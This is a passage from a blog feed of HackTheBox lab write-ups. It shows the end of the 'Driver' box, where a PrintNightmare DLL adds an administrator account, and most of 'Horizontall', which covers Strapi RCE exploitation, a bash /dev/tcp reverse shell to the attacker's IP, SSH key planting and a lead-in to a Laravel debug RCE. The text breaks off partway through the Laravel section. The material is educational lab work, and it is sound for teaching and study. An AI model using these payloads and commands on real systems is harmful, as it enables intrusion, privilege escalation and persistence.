        OutputDebugString(<span style="color:#f1fa8c">&#34;DLL_PROCESS_ATTACH&#34;</span>);
        <span style="color:#ff79c6">break</span>;

    <span style="color:#ff79c6">case</span> <span style="color:#8be9fd;font-style:italic">DLL_THREAD_ATTACH</span>:
        OutputDebugString(<span style="color:#f1fa8c">&#34;DLL_THREAD_ATTACH&#34;</span>);
        <span style="color:#ff79c6">break</span>;

    <span style="color:#ff79c6">case</span> <span style="color:#8be9fd;font-style:italic">DLL_THREAD_DETACH</span>:
        OutputDebugString(<span style="color:#f1fa8c">&#34;DLL_THREAD_DETACH&#34;</span>);
        <span style="color:#ff79c6">break</span>;

    <span style="color:#ff79c6">case</span> <span style="color:#8be9fd;font-style:italic">DLL_PROCESS_DETACH</span>:
        OutputDebugString(<span style="color:#f1fa8c">&#34;DLL_PROCESS_DETACH&#34;</span>);
        <span style="color:#ff79c6">break</span>;
    }

    <span style="color:#ff79c6">return</span> TRUE;
}
</code></pre></td></tr></table>
</div>
</div><p>Dealing with header files remain tricky as I could not compile the below because of pch.h not found:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#6272a4">// dllmain.cpp : Defines the entry point for the DLL application.
</span><span style="color:#6272a4"></span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&#34;pch.h&#34;</span><span style="color:#ff79c6">
</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
</span><span style="color:#ff79c6"></span>
BOOL APIENTRY <span style="color:#50fa7b">DllMain</span>( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    <span style="color:#ff79c6">switch</span> (ul_reason_for_call)
    {
    <span style="color:#ff79c6">case</span> <span style="color:#8be9fd;font-style:italic">DLL_PROCESS_ATTACH</span>:
        system(<span style="color:#f1fa8c">&#34;cmd.exe /c net user bob Pasword1234 /add&#34;</span>);
        system(<span style="color:#f1fa8c">&#34;cmd.exe /c net localgroup administrators bob /add&#34;</span>);
    <span style="color:#ff79c6">case</span> <span style="color:#8be9fd;font-style:italic">DLL_THREAD_ATTACH</span>:
    <span style="color:#ff79c6">case</span> <span style="color:#8be9fd;font-style:italic">DLL_THREAD_DETACH</span>:
    <span style="color:#ff79c6">case</span> <span style="color:#8be9fd;font-style:italic">DLL_PROCESS_DETACH</span>:
        <span style="color:#ff79c6">break</span>;
    }
    <span style="color:#ff79c6">return</span> TRUE;
}
</code></pre></td></tr></table>
</div>
</div><p>We execute the compiled exploit:</p>
<pre><code>$ smbserver.py -smb2support -port 445 test $(pwd)
[..]
───────────────────────────────────────────────────────────────────────────────────────
$ python3 cube0x0/CVE-2021-1675.py driver.htb/tony:liltony@10.10.11.106 '\\10.10.14.51\test\evil.dll'
[*] Connecting to ncacn_np:10.10.11.106[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\10.10.14.51\test\evil.dll
[*] Try 1...
[*] Stage0: 0
[*] Try 2...
[*] Stage0: 0
[*] Stage2: 0
[+] Exploit Completed
</code></pre>
<p>And we verify the account is successfully created:</p>
<pre><code>$ ruby evil-winrm.rb -i 10.10.11.106 -u bob -p Password123
[..]
*Evil-WinRM* PS C:\Users\bob\Documents&gt; whoami
driver\bob
*Evil-WinRM* PS C:\Users\bob\Documents&gt; cd ../../Administrator/Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
cfd835d90e6321f2703569320401aa2e
</code></pre>
]]></content></item><item><title>HTB - Horizontall</title><link>https://0xade1.github.io/posts/2021/10/htb-horizontall/</link><pubDate>Mon, 18 Oct 2021 06:29:42 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/10/htb-horizontall/</guid><description>Enumeration rustscan -a 10.10.11.105 -- -A -sCV [..] PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50💿ff:6b:0d:d5 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDL2qJTqj1aoxBGb8yWIN4UJwFs4/UgDEutp3aiL2/6yV2iE78YjGzfU74VKlTRvJZWBwDmIOosOBNl9nfmEzXerD0g5lD5SporBx06eWX/XP2sQSEKbsqkr7Qb4ncvU8CvDR6yGHxmBT8WGgaQsA2ViVjiqAdlUDmLoT2qA3GeLBQgS41e+TysTpzWlY7z/rf/u0uj/C3kbixSB/upkWoqGyorDtFoaGGvWet/q7j5Tq061MaR6cM2CrYcQxxnPy4LqFE3MouLklBXfmNovryI0qVFMki7Cc3hfXz6BmKppCzMUPs8VgtNgdcGywIU/Nq1aiGQfATneqDD2GBXLjzV | 256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIyw6WbPVzY28EbBOZ4zWcikpu/CPcklbTUwvrPou4dCG4koataOo/RDg4MJuQP+sR937/ugmINBJNsYC8F7jN0= | 256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJqmDVbv9RjhlUzOMmw3SrGPaiDBgdZ9QZ2cKM49jzYB 80/tcp open http syn-ack nginx 1.14.0 (Ubuntu) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Did not follow redirect to http://horizontall.</description><content type="html"><![CDATA[<h2 id="enumeration">Enumeration</h2>
<pre><code>rustscan -a 10.10.11.105 -- -A -sCV
[..]
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50💿ff:6b:0d:d5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDL2qJTqj1aoxBGb8yWIN4UJwFs4/UgDEutp3aiL2/6yV2iE78YjGzfU74VKlTRvJZWBwDmIOosOBNl9nfmEzXerD0g5lD5SporBx06eWX/XP2sQSEKbsqkr7Qb4ncvU8CvDR6yGHxmBT8WGgaQsA2ViVjiqAdlUDmLoT2qA3GeLBQgS41e+TysTpzWlY7z/rf/u0uj/C3kbixSB/upkWoqGyorDtFoaGGvWet/q7j5Tq061MaR6cM2CrYcQxxnPy4LqFE3MouLklBXfmNovryI0qVFMki7Cc3hfXz6BmKppCzMUPs8VgtNgdcGywIU/Nq1aiGQfATneqDD2GBXLjzV
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIyw6WbPVzY28EbBOZ4zWcikpu/CPcklbTUwvrPou4dCG4koataOo/RDg4MJuQP+sR937/ugmINBJNsYC8F7jN0=
|   256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJqmDVbv9RjhlUzOMmw3SrGPaiDBgdZ9QZ2cKM49jzYB
80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre>
<p>Exploring custom javascript file: <a href="http://horizontall.htb/js/app.c68eb462.js">http://horizontall.htb/js/app.c68eb462.js</a> reveal new subdomains: <a href="http://api-prod.horizontall.htb/reviews">http://api-prod.horizontall.htb/reviews</a></p>
<p>We could have wfuzz the dns with those dictionaries:</p>
<pre><code>egrep -Ri &quot;^api-prod$&quot; /opt/SecLists/Discovery/DNS
/opt/SecLists/Discovery/DNS/dns-Jhaddix.txt:api-prod
/opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt:api-prod
</code></pre>
<p>It&rsquo;s an API:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">curl -s http://api-prod.horizontall.htb/reviews | jq
[
  {
    <span style="color:#ff79c6">&#34;id&#34;</span>: <span style="color:#bd93f9">1</span>,
    <span style="color:#ff79c6">&#34;name&#34;</span>: <span style="color:#f1fa8c">&#34;wail&#34;</span>,
    <span style="color:#ff79c6">&#34;description&#34;</span>: <span style="color:#f1fa8c">&#34;This is good service&#34;</span>,
    <span style="color:#ff79c6">&#34;stars&#34;</span>: <span style="color:#bd93f9">4</span>,
    <span style="color:#ff79c6">&#34;created_at&#34;</span>: <span style="color:#f1fa8c">&#34;2021-05-29T13:23:38.000Z&#34;</span>,
    <span style="color:#ff79c6">&#34;updated_at&#34;</span>: <span style="color:#f1fa8c">&#34;2021-05-29T13:23:38.000Z&#34;</span>
  },
  {
    <span style="color:#ff79c6">&#34;id&#34;</span>: <span style="color:#bd93f9">2</span>,
    <span style="color:#ff79c6">&#34;name&#34;</span>: <span style="color:#f1fa8c">&#34;doe&#34;</span>,
    <span style="color:#ff79c6">&#34;description&#34;</span>: <span style="color:#f1fa8c">&#34;i&#39;m satisfied with the product&#34;</span>,
    <span style="color:#ff79c6">&#34;stars&#34;</span>: <span style="color:#bd93f9">5</span>,
    <span style="color:#ff79c6">&#34;created_at&#34;</span>: <span style="color:#f1fa8c">&#34;2021-05-29T13:24:17.000Z&#34;</span>,
    <span style="color:#ff79c6">&#34;updated_at&#34;</span>: <span style="color:#f1fa8c">&#34;2021-05-29T13:24:17.000Z&#34;</span>
  },
  {
    <span style="color:#ff79c6">&#34;id&#34;</span>: <span style="color:#bd93f9">3</span>,
    <span style="color:#ff79c6">&#34;name&#34;</span>: <span style="color:#f1fa8c">&#34;john&#34;</span>,
    <span style="color:#ff79c6">&#34;description&#34;</span>: <span style="color:#f1fa8c">&#34;create service with minimum price i hop i can buy more in the futur&#34;</span>,
    <span style="color:#ff79c6">&#34;stars&#34;</span>: <span style="color:#bd93f9">5</span>,
    <span style="color:#ff79c6">&#34;created_at&#34;</span>: <span style="color:#f1fa8c">&#34;2021-05-29T13:25:26.000Z&#34;</span>,
    <span style="color:#ff79c6">&#34;updated_at&#34;</span>: <span style="color:#f1fa8c">&#34;2021-05-29T13:25:26.000Z&#34;</span>
  }
]
</code></pre></td></tr></table>
</div>
</div><p>it seems that every fields can be queried and hence, fuzzed:</p>
<pre tabindex="0"><code>curl -s http://api-prod.horizontall.htb/reviews\?id\=2
curl -s http://api-prod.horizontall.htb/reviews\?name\=doe
curl -s http://api-prod.horizontall.htb/reviews\?stars\=5
curl -s http://api-prod.horizontall.htb/reviews\?description\=This+is+good+service
curl -s http://api-prod.horizontall.htb/reviews\?created_at\=2021-05-29T13:25:26.000Z
curl -s http://api-prod.horizontall.htb/reviews\?updated_at\=2021-05-29T13:25:26.000Z
curl -s http://api-prod.horizontall.htb/reviews\?id\=1\&amp;name\=wail\&amp;stars\=4\&amp;created_at\=2021-05-29T13:23:38.000Z\&amp;updated_at\=2021-05-29T13:23:38.000Z\&amp;description\=This+is+good+service
</code></pre><p>We can query all fields at once, so excellent candidate for sqlmap, but it did not find a SQL Injection:</p>
<pre><code>./sqlmap.py -u http://api-prod.horizontall.htb/reviews\?id\=1\&amp;name\=wail\&amp;stars\=4\&amp;created_at\=2021-05-29T13:23:38.000Z\&amp;updated_at\=2021-05-29T13:23:38.000Z\&amp;description\=This+is+good+service
</code></pre>
<p>I&rsquo;ll send this query to Repeater instead and look for possible command injection by injecting <code>ping+-c+1+10.10.14.51</code> on each field but nothing came back on my <code>tcpdump -nni utun2 icmp</code></p>
<h1 id="gobuster">gobuster</h1>
<pre><code>gobuster dir -u http://api-prod.horizontall.htb -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 30
[..]
/admin (Status: 200)
/users (Status: 403)
/reviews (Status: 200)
</code></pre>
<p>The /admin response shows <strong>Strapi Admin</strong> login interface, which could be vulnerable to as per searchsploit:</p>
<pre><code>searchsploit strapi
--------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                             |  Path
--------------------------------------------------------------------------- ---------------------------------
Strapi 3.0.0-beta - Set Password (Unauthenticated)                         | multiple/webapps/50237.py
Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated)       | multiple/webapps/50238.py
Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated) | multiple/webapps/50239.py
</code></pre>
<p>Strapi code source is available here: <a href="https://github.com/strapi/strapi">https://github.com/strapi/strapi</a> but not very straightforward to guess the version. Luckily, looking at the most promising exploit with <code>searchsploit -m 50239</code>, we find the /admin/init allows to retrieve strapi version 3.0.0-beta.17.4:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">check_version</span>():
    <span style="color:#ff79c6">global</span> url
    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[+] Checking Strapi CMS Version running&#34;</span>)
    version <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{</span>url<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/admin/init&#34;</span>)<span style="color:#ff79c6">.</span>text
    version <span style="color:#ff79c6">=</span> json<span style="color:#ff79c6">.</span>loads(version)
    version <span style="color:#ff79c6">=</span> version[<span style="color:#f1fa8c">&#34;data&#34;</span>][<span style="color:#f1fa8c">&#34;strapiVersion&#34;</span>]
    <span style="color:#ff79c6">if</span> version <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;3.0.0-beta.17.4&#34;</span>:
        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[+] Seems like the exploit will work!!!</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">[+] Executing exploit</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>)
    <span style="color:#ff79c6">else</span>:
        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[-] Version mismatch trying the exploit anyway&#34;</span>)
</code></pre></td></tr></table>
</div>
</div><h2 id="exploitation-to-get-a-shell-as-strapi">Exploitation to get a shell as strapi</h2>
<pre><code>$ python3 50239.py http://api-prod.horizontall.htb
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM0Njk1NTcyLCJleHAiOjE2MzcyODc1NzJ9.GrDto052BTw4L6q96RqclETSMK6P-1XGCWsNUmIxxG4
</code></pre>
<p>Testing the exploit, it works!</p>
<pre><code>$&gt; ping -c 1 10.10.14.51
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
{&quot;statusCode&quot;:400,&quot;error&quot;:&quot;Bad Request&quot;,&quot;message&quot;:[{&quot;messages&quot;:[{&quot;id&quot;:&quot;An error occurred&quot;}]}]}
-----------------------------------------------------------------------------
$ sudo tcpdump -nni utun5 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on utun5, link-type NULL (BSD loopback), capture size 262144 bytes
10:07:09.475625 IP 10.10.11.105 &gt; 10.10.14.51: ICMP echo request, id 45590, seq 1, length 64
10:07:09.475691 IP 10.10.14.51 &gt; 10.10.11.105: ICMP echo reply, id 45590, seq 1, length 64
</code></pre>
<p>Getting a reverse shell:</p>
<pre><code>$&gt; bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.51/9000 0&gt;&amp;1'
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
──────────────────────────────────────────────────────────────────────────────
_  ~ nc -lnvp 9000
Listening on 0.0.0.0 9000
Connection received on 172.19.0.1 64376
bash: cannot set terminal process group (1844): Inappropriate ioctl for device
bash: no job control in this shell
strapi@horizontall:~/myapi$ id
id
uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)
</code></pre>
<p>We find another user developer</p>
<pre><code>strapi@horizontall:~/myapi$ cat /etc/passwd | grep 100
systemd-network❌100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
developer❌1000:1000:hackthebox:/home/developer:/bin/bash
strapi❌1001:1001::/opt/strapi:/bin/sh
strapi@horizontall:~/myapi$ sudo -l
[sudo] password for strapi
strapi@horizontall:~/myapi$ crontab -l
crontab -l
no crontab for strapi
</code></pre>
<p>The user flag is available and we don&rsquo;t have access to the user .ssh folder:</p>
<pre><code>strapi@horizontall:~/myapi$ ls -l /home
drwxr-xr-x 8 developer developer 4096 Aug  2 12:07 developer
strapi@horizontall:~/myapi$ ls -la /home/developer
drwxr-xr-x  8 developer developer  4096 Aug  2 12:07 .
drwxr-xr-x  3 root      root       4096 May 25 11:43 ..
lrwxrwxrwx  1 root      root          9 Aug  2 12:05 .bash_history -&gt; /dev/null
-rw-r-----  1 developer developer   242 Jun  1 12:53 .bash_logout
-rw-r-----  1 developer developer  3810 Jun  1 12:47 .bashrc
drwx------  3 developer developer  4096 May 26 12:00 .cache
-rw-rw----  1 developer developer 58460 May 26 11:59 composer-setup.php
drwx------  5 developer developer  4096 Jun  1 11:54 .config
drwx------  3 developer developer  4096 May 25 11:45 .gnupg
drwxrwx---  3 developer developer  4096 May 25 19:44 .local
drwx------ 12 developer developer  4096 May 26 12:21 myproject
-rw-r-----  1 developer developer   807 Apr  4  2018 .profile
drwxrwx---  2 developer developer  4096 Jun  4 11:21 .ssh
-r--r--r--  1 developer developer    33 Oct 19 14:47 user.txt
lrwxrwxrwx  1 root      root          9 Aug  2 12:07 .viminfo -&gt; /dev/null
strapi@horizontall:~/myapi$ cat /home/developer/user.txt
dbb5871b90f865698aa2a2808cd7dfd9
</code></pre>
<h2 id="shell-as-root">Shell as root</h2>
<pre><code>strapi@horizontall:~$ ss -lntp
ss -lntp
State Recv-Q Send-Q Local Address:Port Peer Address:Port
LISTEN 0 128 0.0.0.0:22 0.0.0.0:_
LISTEN 0 128 127.0.0.1:1337 0.0.0.0:_ users:((&quot;node&quot;,pid=1844,fd=31))
LISTEN 0 128 127.0.0.1:8000 0.0.0.0:_
LISTEN 0 80 127.0.0.1:3306 0.0.0.0:_
LISTEN 0 128 0.0.0.0:80 0.0.0.0:_
LISTEN 0 128 [::]:22 [::]:_
LISTEN 0 128 [::]:80 [::]:\*
</code></pre>
<p>Two services are running on port 1337 and 8000: nothing special on 1337, but curl on 8000:</p>
<pre><code>curl -s -vvv http://localhost:8000 | grep PHP
&gt; GET / HTTP/1.1
&gt; Host: localhost:8000
&gt; User-Agent: curl/7.58.0
&gt; Accept: */*
&gt;
&lt; HTTP/1.1 200 OK
&lt; X-Powered-By: PHP/7.4.22
[..]
    Laravel v8 (PHP v7.4.18)
</code></pre>
<p>I need to ssh forward those port:</p>
<pre><code>$ ssh-keygen -t rsa -C a@a.a -f /home/ctf/.ssh/id_rsa_horizontall.htb
$ cat ~/.ssh/id_rsa_horizontall.htb.pub | pbcopy
────────────────────────────────────────────────────────────────────────────
strapi@horizontall:~$ echo &quot;ssh-rsa AAAAB3Nz[..]&quot; &gt; ~/.ssh/authorized_keys
strapi@horizontall:~$ chmod 600 ~/.ssh/authorized_keys
</code></pre>
<p>We are successful to ssh forward:</p>
<pre><code>ssh -L 8000:localhost:8000 -i ~/.ssh/id_rsa_horizontall.htb strapi@hohorizontall.htb
[..]
$ id
uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)
$
────────────────────────────────────────────────────────────────────────────
$ curl -s http://localhost:8000 | grep &quot;Laravel v8&quot;
    Laravel v8 (PHP v7.4.18)
</code></pre>
<p>Searchsploit:</p>
<pre tabindex="0"><code>$ searchsploit laravel
------------------------------------------------------------------- ----------------------------
 Exploit Title                                                     |  Path
------------------------------------------------------------------- ----------------------------
Laravel - 'Hash::make()' Password Truncation Security              | multiple/remote/39318.txt
Laravel 8.4.2 debug mode - Remote code execution                   | php/webapps/49424.py
Laravel Administrator 4 - Unrestricted File Upload (Authenticated) | php/webapps/49112.py
Laravel Log Viewer &lt; 0.13.0 - Local File Download                  | php/webapps/44343.py
------------------------------------------------------------------- ----------------------------
$ searchsploit -m 49424
</code></pre><p>Exploit did not work so well because we don&rsquo;t know the path for laravel logs, so I googled and found this blog instead <a href="https://www.ambionics.io/blog/laravel-debug-rce">https://www.ambionics.io/blog/laravel-debug-rce</a> with this github exploit: <a href="https://github.com/ambionics/laravel-exploits">https://github.com/ambionics/laravel-exploits</a></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
